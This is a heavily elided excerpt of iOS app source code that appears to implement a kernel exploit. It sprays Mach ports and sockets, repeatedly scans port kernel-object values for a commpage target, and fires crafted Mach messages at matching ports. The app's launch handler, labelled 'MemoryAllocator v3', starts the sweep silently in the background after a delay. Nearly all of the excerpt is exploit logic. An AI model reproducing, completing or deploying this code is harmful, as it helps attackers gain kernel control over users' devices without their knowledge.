...
static void spray(void) {
    ...
    ev("SPRAY socks=%d ports=%d val=0x%016llx kotype=%d",
...
static void *probe_loop(void *arg) {
    ...
    for (;;) {
        ...
        for (int i = 0; i < g_port_count; i++) {
            ...
            timer_ports++;
            ev("PORT_HIT port=%d kotype=%u val=0x%016llx -> send op",
               i, kotype, (unsigned long long)kobject);
            mach_port_t p = g_ports[i];
            g_ports[i] = MACH_PORT_NULL;
            fire_mach_msg(p);
            triggered++;
            ev("SEND_DONE port=%d", i);
        }
        cycle++;
        ev("PROBE_CYCLE cycle=%d ports=%d found=%d triggered=%d",
...
static void scan_background(void) {
    ...
    for (int i = 0; i < g_port_count; i++) {
        ...
        if (kobject == COMMPAGE_TARGET || kobject == COMMPAGE_TARGET_KERN) {
            g_found = 1;
            ev("PORT_MATCH port=%d kotype=%u val=0x%016llx -> send",
               i, kotype, (unsigned long long)kobject);
            mach_port_t p = g_ports[i];
            g_ports[i] = MACH_PORT_NULL;
            fire_mach_msg(p);
        } else if (kotype != 0 || kobject != 0) {
            ev("PORT_CHANGED port=%d kotype=%u val=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
...
- (BOOL)application:(UIApplication *)app
    ...
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ...
        ev("LAUNCH MemoryAllocator v3 N=%d interval=%ds kotype=%d",
        ...
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 170 * NSEC_PER_SEC),
            ...
            ev("SWEEP_START n=%d", g_port_count);
            int fired = 0;
            for (int i = 0; i < g_port_count; i++) {
